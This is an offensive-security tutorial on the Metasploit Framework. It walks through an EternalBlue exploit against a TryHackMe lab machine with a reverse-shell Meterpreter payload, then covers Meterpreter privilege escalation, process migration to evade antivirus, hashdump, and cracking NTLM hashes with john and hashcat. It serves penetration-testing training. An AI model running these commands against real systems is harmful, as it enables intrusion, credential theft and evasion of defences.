---
description: >-
  Using existing exploits from the Metasploit Framework (MSF) to quickly take
  over machines and escalate privileges
---

# Metasploit

## Example

To get an idea of a regular workflow of finding and using a Metasploit exploit I will showcase the _Blue_ room from TryHackMe:

{% embed url="https://tryhackme.com/room/blue" %}
Beginner room walking through using Metasploit to abuse the Eternal Blue exploit
{% endembed %}

When having completed an `nmap` scan, we find a detailed version number:

{% code overflow="wrap" %}
```
445/tcp   open  microsoft-ds       syn-ack ttl 126 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
{% endcode %}

Just searching for ["Windows 7 Professional 7601 Service Pack 1 **exploit**"](https://www.google.com/search?q=windows+7+professional+7601+service+pack+1+exploit) quickly finds us the MS17-010 "Eternal Blue" exploit at [rapid7.com](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17\_010\_eternalblue/). Here we find the module called `exploit/windows/smb/ms17_010_eternalblue` that will run this exploit on a target. We'll start up `msfconsole` and see how we use the module:

<pre class="language-shell"><code class="lang-shell"><strong>msf6 > use exploit/windows/smb/ms17_010_eternalblue
</strong>[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
<strong>msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
</strong>
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/doc
                                             s/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication
                                             . Only affects Windows Server 2008 R2, Windows 7, Windo
                                             ws Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. On
                                             ly affects Windows Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects
                                              Windows Server 2008 R2, Windows 7, Windows Embedded St
                                             andard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.19.146.158   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
</code></pre>

Two important options to check here are `RHOST` and `LHOST`. The first is the remote host, while the second is the local host that a reverse shell should connect to. You can see that it selected a Meterpreter TCP Reverse Shell by default. Let's set up both of these options:

```sh
# Remote target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.212.158
RHOST => 10.10.212.158
# Local listener
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.8.47.141
LHOST => 10.8.47.141
```

Afterward, we `run` it which will start a **listener** on port 4444 and accept connections on the specified IP address. Then the exploit itself will be **checked** on the target to test if it is vulnerable, and finally, it performs the Remote Code Execution exploit to trigger the reverse shell payload. After some time (and possibly failed attempts) we see it succeed with a newly created session:

<pre class="language-sh"><code class="lang-sh"><strong>msf6 exploit(windows/smb/ms17_010_eternalblue) > run
</strong>
[*] Started reverse TCP handler on 10.8.46.141:4444
[*] 10.10.212.158:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.212.158:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.212.158:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.212.158:445 - The target is vulnerable.
...
[*] 10.10.212.158:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.212.158
[*] Meterpreter session 1 opened (10.8.46.141:4444 -> 10.10.212.158:49164) at 2023-06-29 21:47:47 +0200
[+] 10.10.212.158:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.212.158:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.212.158:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

<strong>meterpreter >
</strong></code></pre>

We find ourselves in a shell on the machine, where we can perform [#meterpreter](metasploit.md#meterpreter "mention") commands like `getsystem` or start a `cmd.exe` process using `shell`.&#x20;

## Exploits & Payloads

Metasploit has a wide variety of **exploits**, made easily exploitable thanks to **payloads**. You can view all exploits using `show exploits`, which is a collection of many CVE proofs of concepts from ancient to modern. These scripts are highly specific and often only work on very specific unpatched versions of software. \
Payloads on the other hand are very generic and are delivered through exploits. You can view these with `show payloads`. A payload might be a reverse or bind shell for Windows, that can be used in many different exploits as a final result. There are many different types of payloads depending on OS, architecture, usability, and method. Here are a few common terms you'll find:

* **Inline**: The complete payload with all logic is delivered in one go, without any extra steps
* **Staged**: A small "stager" payload is sent first, which later fetches the real logic from your listener when triggered. These can be more stealthy and are smaller in size because they are executed in memory and network traffic is often encrypted
* **Meterpreter**: This is a special type of shell provided by the Metasploit Framework, that when connected has lots of utility commands for further exploitation like enumeration, privilege escalation, and much more. You can also get a regular shell with the `shell` command, see [#meterpreter](metasploit.md#meterpreter "mention") for more information

### Finding exploits

One simple way of finding exploits is simply through a search engine. Looking up a CVE number, or even a version number for some software will often find you relevant information and potential exploits. Metasploit is made by _Rapid7_ and you might find that site while searching, which means it will be available in Metasploit (tip: use `site:rapid7.com` as a dork).&#x20;

If you rather like staying on the command-line, the `msfconsole` has a `search` command where you can put keywords that will match any exploits in the local database. If you wanted to find the famous "Eternal Blue" exploit, for example, try searching for `search eternal blue` and find a few related exploits:

<pre class="language-sh"><code class="lang-sh"><strong>msf6 > search eternal blue
</strong>
   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</code></pre>

You can then choose any one of them using `use [id]` or with their Name, or simply get more detailed information using the `info [id]` command. \
Using this command you will find some different types of modules (filter using `type:[type]`):

* `exploits`: Directly exploitable by setting some options, and often resulting in Remote Code Execution
* `auxiliary`: Information-gathering modules that are not directly exploits, but provide useful information
* `post`: After having exploited a target, you can use these modules to get further (_post_-exploitation). These are similar to the meterpreter but are way more diverse and more maintained

{% hint style="info" %}
**Tip**: Another way of finding public exploits unrelated to Metasploit, is using `searchsploit` to from [exploit-db](https://www.exploit-db.com/). They host many popular proof of concepts ready for use and can be searched through with search engines or this `searchsploit` tool right from the command-line.

If you don't find anything directly available in a database, there is a decent chance a simple proof of concept can be found on [Github](https://github.com/search) when searching there, which will on average require a bit more thinking in order to use.
{% endhint %}

### Running Modules

When you have found the modules you want to run, be it an `exploit` or `auxiliry`, the procedure is the same:

1. Start by **selecting** it with `use` with its ID from the `search`, or the full name. You can only use one module at a time. While typing this command tab-completion is available, and you can always go back after selecting a module using `back`
2.  Configure the **options** of the module as seen in `show options` or `info`. There are some general options like `RHOST` and `RPORT` that every module has as the remote target, together with some more specific options depending on the module. These can all be set using `set`:\


    <pre class="language-sh"><code class="lang-sh">> set [key] [value]
    <strong>> set RHOST 10.10.10.10
    </strong>RHOST => 10.10.10.10
    </code></pre>

    \
    For exploits, you will also need a `payload`. This is chosen for you by default, but if you ever want to change it to something specific you found use `set payload [name]` to select it. You can also use `setg` to set an option globally, for all future modules you select\


    {% hint style="info" %}
    Reverse shell payloads have an `LHOST` option that is the local host that you will listen for a shell on (together with `LPORT`). \
    This **IP** address or network **interface** decides where connections will be accepted from, so it is important that this is set to where you expect the connection from the target to go. This is often your private IP address for the network you are connecting over to access the target, or `0.0.0.0` to accept it from anywhere
    {% endhint %}
3. Finally when all it set up, use `run` to start the module and see its output. When successful, a module might create an interactable session with a shell you can access, or simply give you information, depending on the module. Note that some inconsistent modules require _multiple_ runs to be successful, which will often be explained in its `info` page

{% hint style="warning" %}
**Tip**: You can always stop a module using `Ctrl+C` to cancel it if you do not expect it to succeed, or you made a mistake\
**Tip 2**: To _background_ a shell, without directly closing it, use `Ctrl+Z` inside the shell. Then you can later come back to it or upgrade it to [#meterpreter](metasploit.md#meterpreter "mention")
{% endhint %}

### Managing Sessions

**View** any active sessions using the `sessions` command, and then choose one to interact with or kill. All sessions have an ID that can be used with `sessions -i [id]` to start **interactively** executing commands on the target. To remove or "**kill**" a session, use the `sessions -k [id]` command which will remove it from the list and close the connection (use `-K` to kill all).&#x20;

Another useful option is using `sessions -u [id]` to **upgrade** a session from a regular shell to a [#meterpreter](metasploit.md#meterpreter "mention") shell. This allows you to use pre-built commands for enumeration, privilege escalation, or otherwise interesting actions on any system without having to remember all the complex scripting that would normally go into such tasks.&#x20;

## Meterpreter

This special type of shell was mentioned earlier and can be created by selecting a `meterpreter` payload, or by upgrading a shell to use meterpreter. What it allows you to do is keep a consistent connection with pre-built commands that allow for easy enumeration, privilege escalation, and persistence.&#x20;

While the following section explains a few specific commands with example use-cases, you can list all commands with `help` and find information about a specific command using `[command] -h`.

The `run [name]` command is special as it contains many different **scripts** for post-exploitation. These can be found in the `msfconsole` using `search type:post` and ran using the command.&#x20;

### Privilege Escalation

#### `getsystem` - Try to escalate using known methods

A few well-known methods exist for getting `NT Authority/SYSTEM` privileges in a shell. This command tries a few common ones that require various different misconfigurations or privileges, which can get you an easy win.&#x20;

At the time of writing this implements **Token Duplication** (In Memory/Admin) and **Named Pipe Impersonation** (In Memory/Admin, Dropper/Admin, RPCSS variant, PrintSpooler variant, and EFSRPC variant - AKA EfsPotato).

#### `ps` & `migrate` - Transferring the host process

Just like in Linux, the `ps` command shows all active **processes** on the system. This can give you an idea of what is happening, and can also be useful for further exploits involving these processes. One trick is using the `migrate` command to transfer the process running our shell to a different existing process. There are a few reasons why you would want to do this ([source](https://www.hackingarticles.in/metasploit-for-pentester-migrate/)):

* **Stability**: Exploits and Payloads that are providing the session tend to be unstable compared to already-running processes on the target. Hence, migrating to those processes can provide a more stable connection for further commands
* **Cloaking**: Antivirus Software or any other Defensive Software tends to scan and look for malicious files running on the machine. By changing the host process, the exploit might go undetected as it runs under a process expected to be there, raising fewer suspicions.
* **Compatibility**: It is possible that while exploiting a machine the payload you used might be designed for the 64-bit Architecture but the session that you have received is an Operating System running an 86-bit Architecture. Migrate can be used to shift the process to the native process and provide compatibility to the session

In order to perform such a migration, we simply choose a process we like and try to use it with `migrate [PID]`. Some processes owned by other users will likely give "Access is denied" errors as we cannot take them over, even processes from our _own_ user might give this error. Almost always, however, there will be another low-privilege process running that you are able to use. Also, note that migrating may sometimes require _multiple attempts_ to be successful.

#### `hashdump` - Dump system hashes to crack passwords

When you have enough privileges to do so, you can dump all the stored password hashes Windows uses with the `hashdump` command. It simply prints out the username and hash in a format [#john-the-ripper](../cryptography/hashing/cracking-hashes.md#john-the-ripper "mention") understands, which can then be cracked locally with incredibly high speeds.&#x20;

There is also the `run post/windows/gather/smart_hashdump` module that does the same, but in a smarter way by giving more output, even extracting password _hints_ to make better guesses, and finally writing them all to a file. This is the recommended way to extract hashes.&#x20;

When you have a list of hashes, you can crack them with either `john` (CPU) or `hashcat` (GPU). The latter takes longer to set up but is often much faster in cracking speed. The hashes are Windows NTLM hashes that can often be brute-forced at speeds of `~35GH/s` (that is 35 billion per second). Here are some practical examples:

<pre class="language-shell-session" data-title="Using john"><code class="lang-shell-session"><strong>$ john hashes.txt --wordlist=/list/rockyou.txt --format=NT
</strong>Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
<strong>P4ssw0rd         (User)
</strong>... <a data-footnote-ref href="#user-content-fn-1">1.298g/s</a> ...
Use the "--show --format=NT" options to display all of the cracked passwords reliably
</code></pre>

<pre class="language-shell-session" data-title="Using hashcat"><code class="lang-shell-session">$ hashcat -m 1000 hashes.txt /list/rockyou.txt --username
...
<strong>ac1dbef8523bafece1428e067c1b114f:P4ssw0rd
</strong>... <a data-footnote-ref href="#user-content-fn-2">9GH/s</a> ...
</code></pre>

[^1]: 1.2 billion hashes per second

[^2]: 9 billion hashes per second
